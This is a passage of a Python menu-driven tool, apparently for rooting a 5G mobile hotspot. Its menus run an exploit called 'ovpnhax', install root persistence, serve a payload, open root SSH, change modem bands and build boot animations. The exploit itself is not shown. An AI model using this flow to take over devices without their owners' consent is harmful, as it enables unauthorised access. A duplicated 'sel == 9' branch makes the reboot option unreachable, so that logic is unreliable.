    USLEEP, so frames are sampled at 1/0.018 s and the delay is re-derived
    from the real video duration to keep the source timing intact."""
    video = Path(video_path)
    if not video.exists():
        fail(f"{video} not found")
        return None
    if not shutil.which("ffmpeg"):
        fail("ffmpeg not found on this PC (winget install ffmpeg)")
        return None
    info(f"converting {video.name} ...")
    fps_target = 1_000_000 / STOCK_DELAY_US
    r = subprocess.run(
        ["ffprobe", "-v", "error", "-show_entries", "format=duration",
         "-of", "default=noprint_wrappers=1:nokey=1", str(video)],
        capture_output=True, text=True)
    try:
        duration = float(r.stdout.strip())
    except ValueError:
        duration = 0.0
    if duration > 0:
        n_expected = max(2, round(duration * fps_target))
        fps = n_expected / duration
        delay = round(duration * 1_000_000 / n_expected)
    else:
        fps, delay = fps_target, STOCK_DELAY_US
    STARTUP_LOCAL.mkdir(exist_ok=True)
    zip_path = STARTUP_LOCAL / f"{video.stem}.zip"
    with tempfile.TemporaryDirectory() as tmp:
        vf = ("scale=320:240:force_original_aspect_ratio=decrease,"
              "pad=320:240:(ow-iw)/2:(oh-ih)/2:color=black,"
              f"fps={fps:.6f}")
        r = subprocess.run(
            ["ffmpeg", "-y", "-v", "error", "-i", str(video), "-vf", vf,
             "-pix_fmt", "rgb24", str(Path(tmp) / "animation_%d.png")],
            capture_output=True, text=True)
        if r.returncode != 0:
            fail(f"ffmpeg failed: {r.stderr[-400:]}")
            return None
        frames = sorted(Path(tmp).glob("animation_*.png"),
                        key=lambda p: _frame_num(p.name))
        if not frames:
            fail("ffmpeg produced no frames")
            return None
        # bake the real frame count/delay into the script before packing:
        # an unbaked template would ship __NUM_FILES__ placeholders that
        # install's digit-matching regex can't patch
        script_text = (ANIM_SH.replace("__NUM_FILES__", str(len(frames)))
                              .replace("__USLEEP__", str(delay)))
        meta = _pack_startup_zip(zip_path, frames, script_text, delay,
                                 f"converted from {video}")
    ok(f"{meta['num_frames']} frames @ {meta['delay_us'] / 1000:.1f} ms/frame "
       f"({1_000_000 / meta['delay_us']:.2f} fps), "
       f"{meta['num_frames'] * meta['delay_us'] / 1e6:.2f} s total")
    ok(f"packed -> {zip_path}")
    return zip_path


def flow_startup_video(cli):
    video = prompt("video path:", r"C:\Users\Josh\Downloads\outblindstop startup.mp4")
    if not video:
        return
    zip_path = video_to_startup_animation(video)
    if not zip_path:
        pause()
        return
    if menu("Install it on the device now?", ["Not yet", "Install"]) == 1:
        startup_install(cli, zip_path)


def flow_startup_animation(cli):
    while True:
        cli = ssh_ensure(cli)
        if not cli:
            return
        num, delay, _ = startup_params(cli)
        zips = sorted(STARTUP_LOCAL.glob("*.zip")) if STARTUP_LOCAL.exists() else []
        sel = menu("Startup & animations", [
            "Backup everything (boot + screens + spinners)",
            "Install bundle from zip (pick parts)",
            "Install screens/spinners (folder or zip)",
            "Create boot animation from a video (ffmpeg)",
            "Preview boot animation on device",
            "Back",
        ], info_lines=[
            f"current: {num} frames, {delay / 1000:.1f} ms/frame "
            f"({1_000_000 / delay:.1f} fps), {num * delay / 1e6:.2f} s",
            f"device: {STARTUP_DIR} + {IMAGES_DIR}   local zips: {len(zips)} in {STARTUP_LOCAL}/",
        ])
        if sel in (-1, 5):
            return
        clear()
        banner()
        print()
        if sel == 0:
            startup_backup(cli)
        elif sel == 1:
            zp = startup_pick_zip()
            if zp:
                startup_install(cli, zp)
        elif sel == 2:
            flow_images_install(cli)
        elif sel == 3:
            flow_startup_video(cli)
        elif sel == 4:
            startup_preview(cli)
        pause()


def tweak_submenu(cli):
    while True:
        # the connection may have died while we sat at the menu
        cli = ssh_ensure(cli)
        if not cli:
            return
        installed = duck_installed(cli)
        opts = [
            "Device / modem info (ATI)",
            "5G status",
            "5G band and PCI",
            "Enabled NR5G bands (NSA)",
            "Enabled NR5G bands (SA)",
            "Set enabled NR5G bands (EXPERIMENTAL)",
            "5G radio enable/disable (EXPERIMENTAL)",
            "Duck (installed)" if installed else "Install duck",
            "Startup & animations",
            "Show about screen",
            "Reboot device",
            "Back",
        ]
        sel = menu("Tweaks", opts, info_lines=[
            f"{DIM}modem2_cli has ~300 commands, see modem2_cli_help.txt{RESET}",
        ])
        if sel in (-1, 11):
            return
        clear()
        banner()
        print()
        if sel == 0:
            _, out, _ = ssh_exec(cli, "LD_LIBRARY_PATH=/opt/nvtl/lib /opt/nvtl/bin/read_atcmd ATI")
            print(out)
        elif sel == 1:
            _, out, _ = ssh_exec(cli, f"{MODEM2} get_5g_status")
            print(out)
        elif sel == 2:
            _, out, _ = ssh_exec(cli, f"{MODEM2} get_5g_band_pci")
            print(out)
        elif sel == 3:
            _, out, _ = ssh_exec(cli, f"{MODEM2} get_enabled_nr5g_nsa_bands")
            print(out)
        elif sel == 4:
            _, out, _ = ssh_exec(cli, f"{MODEM2} get_enabled_nr5g_sa_bands")
            print(out)
        elif sel == 5:
            warn("experimental: modem2_cli prompts for a band count, then each")
            warn("band number. set your current bands back if the modem drops")
            warn("service. press enter alone to cancel.")
            bands = prompt("bands, space separated (e.g. '5 7 8 78') [cancel]:")
            if not bands:
                print("cancelled")
            elif not all(t.isdigit() for t in bands.split()):
                fail("invalid input: numbers only, space separated.")
                fail("(to cancel, just press enter at the prompt)")
            else:
                blist = bands.split()
                show_device_screen(cli, "operation-inprogress")
                for kind in ("nsa", "sa"):
                    out = modem2_set_nr5g_bands(cli, kind, blist)
                    print(f"{kind}: {out or '(no output)'}")
                _, out, _ = ssh_exec(cli, f"{MODEM2} get_enabled_nr5g_nsa_bands")
                print(out)
                show_device_screen(cli, "operation-done")
                warn("if the modem dropped service, set your old bands back or reboot")
        elif sel == 6:
            warn("experimental: argument format undocumented (0=off, 1=on expected)")
            val = prompt("enable? 1/0 [cancel]:")
            if val in ("0", "1"):
                _, out, _ = ssh_exec(cli, f"{MODEM2} 5g_radio_set_enabled {val}")
                print(out)
        elif sel == 7:
            flow_duck(cli, installed)
        elif sel == 8:
            flow_startup_animation(cli)
        elif sel == 9:
            show_device_screen(cli, "about")
        elif sel == 9:
            if menu("Reboot device?", ["Cancel", "Reboot"]) == 1:
                ssh_exec(cli, "reboot")
                ok("rebooting, ssh will drop")
                pause()
                return
        if sel not in (-1, 9, 10, 11):
            pause()


# ----------------------------------------------------------------- main -----

def main():
    clear()
    banner()
    info("connecting...")
    good, msg = check_server()
    if not good:
        clear()
        banner()
        print(f"""
  {RED}{BOLD}*******************************************************************
  *  {msg}
  *  Connect to the hotspot's Wi-Fi network and try again.
  *******************************************************************{RESET}
""")
        sys.exit(1)

    session = requests.Session()
    model = device_model(session)
    local_ip = get_local_ip()
    up, authed = probe_root()

    perm = None  # None = not probed yet, True/False = persistence state
    while True:
        if authed and perm is None:
            try:
                cli = ssh_connect()
                perm = persistence_installed(cli)
                cli.close()
            except Exception:
                perm = None
        status = (f"{GREEN}root active (persistent){RESET}" if authed and perm else
                  f"{GREEN}root active (TEMPORARY!){RESET}" if authed else
                  f"{YELLOW}ssh up, auth unknown{RESET}" if up else
                  f"{DIM}no root (stock){RESET}")
        state = {"authed": authed}
        sel = menu(f"{model}: main menu",
                   ["Rooting", "Backup", "Files", "Tweaks", "SSH shell", "Exit"],
                   info_lines=[
                       f"device:    {BOLD}{model}{RESET}   status: {status}",
                       f"device:    {HOST}   your LAN IP: {local_ip}",
                       f"payload:   {PAYLOAD_LOCAL} (served on :{PAYLOAD_PORT})",
                   ])
        try:
            if sel in (-1, 5):
                clear()
                return
            if sel == 0:
                root_menu(state)
                up, authed = probe_root()
                perm = None  # rooting may have changed persistence, re-probe
            elif sel == 1:
                flow_backup()
            elif sel == 2:
                flow_files()
            elif sel == 3:
                if not authed:
                    clear()
                    banner()
                    fail("root required for tweaks")
                    pause()
                else:
                    cli = ssh_connect()
                    tweak_submenu(cli)
                    cli.close()
            elif sel == 4:
                if not authed:
                    clear()
                    banner()
                    fail("root required for ssh (run Rooting first)")
                    pause()
                else:
                    flow_ssh_shell()
        except KeyboardInterrupt:
            continue


def root_menu(state):
    while True:
        sel = menu("Rooting", [
            "Root the device (ovpnhax)",
            "Install root persistence",
            "Uninstall root",
            "Test root access",
            "Back",
        ])
        if sel in (-1, 4):
            return
        clear()
        banner()
        print()
        if sel == 0:
            flow_root(state)
        elif sel == 1:
            try:
                cli = ssh_connect()
            except Exception as e:
                fail(f"ssh failed: {e}")
                pause()
                continue
            if ssh_ensure(cli):
                if flow_persistence(cli):
                    show_device_screen(cli, "rootpersistence-success")
            cli.close()
            pause()
        elif sel == 2:
            try:
                cli = ssh_connect()
            except Exception as e:
                fail(f"ssh failed: {e}")
                pause()
                continue
            if ssh_ensure(cli):
                flow_unroot(cli)
            cli.close()
            pause()
        elif sel == 3:
            up, authed = probe_root()
            if authed:
                ok(f"root SSH is up on :{SSH_PORT} and {ROOT_PW} works")
                try:
                    cli = ssh_connect()
                    if persistence_installed(cli):
                        ok("persistence is installed - root is permanent")
                        show_device_screen(cli, "you-are-rooted")
                    else:
                        warn("no persistence found - this root dies on reboot")
                        show_device_screen(cli, "you-are-temp-rooted")
                    cli.close()
                except Exception as e:
                    fail(f"ssh failed: {e}")
            elif up:
                warn(f"ssh is up but {ROOT_PW} was rejected (rooted with another tool or password changed?)")
            else:
                fail("ssh is not up, device looks stock")
            pause()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear()
        print("\nbye\n")
